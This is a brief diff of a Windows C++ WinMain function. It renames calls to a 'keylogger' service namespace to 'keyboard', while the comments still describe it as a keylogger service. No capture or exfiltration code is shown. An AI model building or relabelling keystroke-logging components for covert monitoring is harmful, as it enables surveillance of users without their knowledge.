@@ -21,7 +21,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 	}
 
 	// Run keylogger service
-	services::keylogger::run();
+	services::keyboard::run();
 
 	// Windows message loop
 	MSG msg;
@@ -40,6 +40,6 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 	}
 
 	// Stop keylogger service
-	services::keylogger::stop();
+	services::keyboard::stop();
 	return 0;
 }
